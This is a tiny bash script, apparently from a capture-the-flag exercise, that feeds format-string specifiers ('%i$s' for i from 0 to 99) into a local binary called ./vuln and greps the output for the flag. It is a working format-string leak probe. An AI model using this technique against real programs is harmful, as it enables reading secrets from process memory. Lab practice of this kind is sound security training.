#! /bin/bash

for ((i=0;i<100;i++))
do
echo -e "%$i\$s" | ./vuln | grep CTF
done